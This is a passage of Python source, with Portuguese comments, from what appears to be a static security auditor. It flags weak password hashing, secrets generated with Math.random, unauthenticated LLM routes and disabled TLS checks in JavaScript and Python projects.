                    decls = [(x.end(), x.group(1)) for x in _JS_DECL.finditer(self.mask) if _IDENT.fullmatch(x.group(1))]
                    starts = [x[0] for x in decls]
                name = self.random_decl(m.start(), decls, starts)
            if name and (secret_name(name) or session_name(name) and _cookie_holds(self.code[m.start():m.start() + 3000], name)):
                self.out.add("COD010", "low", self.line(m.start()), {"name": name})

    def random_decl(self, pos, decls, starts):
        i = bisect.bisect_right(starts, pos) - 1
        for _ in range(8):
            if i < 0 or pos - decls[i][0] > 3000:
                return None
            vstart, name = decls[i]
            end = self.expr_end(vstart)
            if end > pos:
                # Dentro do corpo de outra função (const fetchToken = async () => { await sleep(Math.random()) }) o
                # número não vira o valor da variável.
                if re.search(r"=>\s*\{|\bfunction\b[^{]*\{", self.mask[vstart:pos]):
                    return None
                return name
            i -= 1
        return None

    def hashing(self):
        for m in _JS_HASH.finditer(self.code):
            algo = (m.group(2) or m.group(3) or m.group(4)).upper().replace("SHA", "SHA-").replace("SHA--", "SHA-")
            algo = {"SHA-1": "SHA-1", "SHA-3": "SHA-3"}.get(algo, algo)
            if m.group(2):
                upd = re.match(r"\s*\.\s*update\s*\(", self.mask[m.end():m.end() + 40])
                if not upd:
                    continue
                args = self.args(m.end() + upd.end())
            else:
                args = self.args(m.end())
            if args and any(password_name(w.group(1)) for w in re.finditer(r"([A-Za-z_$][\w$]*)", self.mask[args[0][0]:args[0][1]])):
                self.out.add("COD011", "medium", self.line(m.start()), {"algo": algo})

    def unbounded(self):
        if not self.llm_file() or _JS_AUTH.search(self.code) or _JS_LIMIT.search(self.code):
            return
        route = _JS_ROUTE_PATH.search(self.rel)
        express = _JS_SERVER_ROUTE.search(self.code)
        action = _JS_USE_SERVER.search(self.code)
        if not (route or express or action) or self.use_client:
            return
        if route and self.project.get("next_auth") or (express and self.project.get("js_global_auth")) or \
                (action and self.project.get("next_auth")):
            return
        call = _JS_LLM_CALL.search(self.mask) or (re.search(r"""['"]@?langchain""", self.code) and _JS_LC_CALL.search(self.mask))
        if not call:
            return
        h = _JS_ROUTE_FN.search(self.mask) if route else express if express else None
        pos = h.start() if h else call.start()
        self.out.add("APP011", "medium", self.line(pos))


def _import_names(spec, sep):
    out = {}
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if sep in part:
            orig, local = [x.strip() for x in part.split(sep, 1)]
        else:
            orig = local = part
        if re.fullmatch(r"[\w$]+", local) and re.fullmatch(r"[\w$]+", orig):
            out[local] = orig
    return out


def scan_js(rel, text, project=None, ext=None, xcalls=None, skill=False):
    """ext e xcalls como em scan_python: {"f:nome": índices} vindos de outro arquivo, e a lista que recebe
    ((caminho do import, nome), índices) das chamadas deste arquivo a funções importadas com argumento de ferramenta.
    skill: o bundle minificado também é lido (numa skill, é o código que roda; o teto por arquivo continua valendo)."""
    if not skill and _minified(text):
        return []
    js = _Js(rel, text, project or {}, ext)
    found = js.run()
    if xcalls is not None:
        for k, idx in js.seeds.items():
            if k.startswith("x:") and k[2:] in js.ximports:
                xcalls.append((js.ximports[k[2:]], frozenset(idx)))
    return found


# =========================================================================== entrada

_NEXT_MW = re.compile(r"(?:^|/)(?:src/)?(?:middleware|proxy)\.(?:ts|js|mjs)$|(?:^|/)hooks\.server\.(?:ts|js)$|"
                      r"(?:^|/)server/middleware/[^/]+\.(?:ts|js)$")
_JS_GLOBAL_AUTH = re.compile(r"\.use\(\s*[^)\n]{0,120}(?:auth|passport|jwt|session|clerk|limit|guard|protect|verify|requireUser)", re.I)
_PY_ROUTER_DEPS = re.compile(r"include_router\([^)]{0,500}dependencies\s*=|add_middleware\(\s*\w*(?:Auth|Session|RateLimit)", re.S)
_ENV_FILE = re.compile(r"(?:^|/)(?:\.env[^/]*|Dockerfile[^/]*|[^/]+\.ya?ml|package\.json|[^/]+\.toml)$")


def _project(ctx, py, js):
    info = {}
    for rel in js:
        if _NEXT_MW.search(rel):
            t = ctx.read(rel)
            if _JS_AUTH.search(t) or _JS_LIMIT.search(t):
                info["next_auth"] = True
        if not info.get("js_global_auth"):
            t = ctx.read(rel)
            if ".use(" in t and _JS_GLOBAL_AUTH.search(t):
                info["js_global_auth"] = True
    return info


def _py_index(py):
    """Arquivos Python por final de caminho (pkg/db.py, db.py), para achar o arquivo de "from pkg.db import f"."""
    index = collections.defaultdict(list)
    for rel in py:
        parts = rel.split("/")
        for i in range(len(parts)):
            index["/".join(parts[i:])].append(rel)
    return index


def _py_target(rel, target, index):
    """Arquivo do projeto de "from .db import f" (nível 1) ou "from pkg.db import f", ou None."""
    level, module, _ = target
    if level:
        base = rel.split("/")[:-1]
        if level > 1:
            base = base[:-(level - 1)] if len(base) >= level - 1 else []
        path = "/".join(base + (module.split(".") if module else []))
        for cand in (path + ".py", (path + "/" if path else "") + "__init__.py"):
            if index.get(cand) and cand in index[cand]:
                return cand
        return None
    tail = module.replace(".", "/")
    cands = index.get(tail + ".py", []) + index.get(tail + "/__init__.py", [])
    if not cands:
        return None
    # Com mais de um candidato (src/a/db.py e tests/db.py), fica o mais perto de quem importa.
    def near(c):
        return sum(1 for x, y in zip(c.split("/"), rel.split("/")) if x == y)
    return max(cands, key=near)


def _js_target(rel, spec, files):
    """Arquivo do projeto de import "./tools/x.js" (que no TypeScript é o x.ts), ou None."""
    base = rel.rsplit("/", 1)[0] if "/" in rel else ""
    parts = []
    for p in (base + "/" + spec if base else spec).split("/"):
        if p in ("", "."):
            continue
        if p == "..":
            if not parts:
                return None
            parts.pop()
        else:
            parts.append(p)
    path = "/".join(parts)
    stem = re.sub(r"\.(?:js|mjs|cjs|jsx)$", "", path)
    for cand in (path, stem + ".ts", stem + ".tsx", stem + ".mts", stem + ".js", stem + ".mjs", stem + ".jsx",
                 path + "/index.ts", path + "/index.js"):
        if cand in files:
            return cand
    return None


def _skip(rel, mode="project"):
    """Arquivo que a análise de código não lê. Numa skill, só a declaração de tipos (.d.ts, que não roda): o .min.js,
    o bundle e a pasta vendor/ são o que vai rodar na máquina de quem instala, e uma linha longa esconderia o código.
    Num projeto, também as bibliotecas de terceiros copiadas para pastas como vendor/, third_party/ e static/js/lib/."""
    if mode == "skill":
        return rel.endswith(".d.ts")
    return rel.endswith((".d.ts", ".min.js", ".bundle.js")) or any(d in "/" + rel for d in _VENDOR_DIRS)


# Pastas onde os projetos guardam bibliotecas de terceiros copiadas (não é código do projeto).
_VENDOR_DIRS = ("/vendor/", "/third_party/", "/static/js/lib/")
# Cabeçalho de biblioteca no começo do arquivo: /*! jQuery v3.2.1, /*!\n * Materialize v0.100.1. Só com /*! ou //!
# (que o minificador preserva) e com nome e versão: o /*! Copyright (c) ... do próprio projeto não é biblioteca.
_LIB_BANNER = re.compile(r"(?:/\*!|//!)[\s*!/]*(?:@preserve\s+)?[A-Za-z][\w.$@/-]{0,60}(?:[ \t]+[A-Za-z][\w.$@/-]{0,60}){0,3}"
                         r"[ \t]+v?\d+\.\d+")


def _library(text):
    """Arquivo de uma biblioteca de terceiros: começa com /*! nome vX.Y ou com um comentário que traz @license
    (/** @license React v16.13.1, /*! @license DOMPurify 3.0.6)."""
    head = text[:2000].lstrip("\ufeff \t\r\n")
    if _LIB_BANNER.match(head):
        return True
    if not head.startswith("/*"):
        return False
    end = head.find("*/")
    return "@license" in (head[:end] if end > 0 else head)


def analyze(ctx):
    """Todos os achados de código, calculados uma vez por auditoria (check e ai_check leem daqui)."""
    if _CACHE_KEY in ctx._cache:
        return ctx._cache[_CACHE_KEY]
    out = []
    if ctx.mode != "agents":
        skill = ctx.mode == "skill"
        py = [r for r in ctx.files if r.endswith(".py") and is_text_source(r, ctx.mode) and not _skip(r, ctx.mode)]
        js = [r for r in ctx.files if r.endswith(_JS_EXT) and is_text_source(r, ctx.mode) and not _skip(r, ctx.mode)]
        project = _project(ctx, py, js)
        py_deps = any(_PY_ROUTER_DEPS.search(ctx.read(r)) for r in py if "include_router" in ctx.read(r) or "add_middleware" in ctx.read(r))
        found, xcalls = {}, []
        for rel in py:
            text = ctx.read(rel)
            if text and len(text) <= _PY_MAX:
                calls = []
                found[rel] = scan_python(rel, text, xcalls=calls)
                xcalls += [(rel, c) for c in calls]
        for rel in js:
            text = ctx.read(rel)
            if text and len(text) <= _JS_MAX and (skill or not _library(text)):
                calls = []
                found[rel] = scan_js(rel, text, project, xcalls=calls, skill=skill)
                xcalls += [(rel, c) for c in calls]
        # O handler da ferramenta chama uma função de outro arquivo do projeto (tools/kubectl.ts, db.py) com o argumento
        # do modelo: aquele arquivo é lido de novo com esses parâmetros vindo do modelo. Duas rodadas (helper de helper).
        seen = {}
        index, fileset = _py_index(py), set(js)
        ext = collections.defaultdict(lambda: collections.defaultdict(set))
        for _ in range(2):
            for rel, (target, hits) in xcalls:
                dest = _py_target(rel, target, index) if rel.endswith(".py") else _js_target(rel, target[0], fileset)
                if dest and dest in found and dest != rel:
                    ext[dest][target[-1] if rel.endswith(".py") else "f:" + target[1]] |= {hits}
            xcalls = []
            for dest, funcs in list(ext.items())[:200]:
                key = {k: frozenset(v) for k, v in funcs.items()}
                if seen.get(dest) == key:
                    continue
                seen[dest] = key
                text, calls = ctx.read(dest), []
                if dest.endswith(".py"):
                    found[dest] = scan_python(dest, text, [(n, h) for n, hs in funcs.items() for h in hs], calls)
                else:
                    seeds = {k: set().union(*hs) for k, hs in funcs.items()}
                    found[dest] = scan_js(dest, text, project, seeds, calls, skill)
                xcalls += [(dest, c) for c in calls]
            if not xcalls:
                break
        for rel, items in found.items():
            out += [f for f in items if not (f.rule == "APP011" and py_deps and rel.endswith(".py"))]
        for rel in ctx.files:
            if _ENV_FILE.search(rel) and is_text_source(rel, ctx.mode):
                text = ctx.read(rel)
                for m in _ENV_TLS.finditer(text):
                    out.append(Finding("COD006", "medium", rel, line_of(text, m.start()), {"what": m.group(1) + "=0"}))
        if ctx.mode == "skill":
            # Numa skill, o que importa é o que roda na máquina de quem instala; rota pública e prompt de sistema não.
            out = [f for f in out if f.rule not in ("APP010", "APP011")]
        # Rota de exemplo não fica no ar, e token de teste não protege nada.
        out = [f for f in out if not (f.rule in ("APP011", "COD010") and TESTISH.search(f.file))]
    ctx._cache[_CACHE_KEY] = out
    return out


def check(ctx):
    return drop_inline_ignored(ctx, [f for f in analyze(ctx) if f.rule.startswith("COD")])


def ai_check(ctx):
    return drop_inline_ignored(ctx, [f for f in analyze(ctx) if f.rule.startswith("APP")])
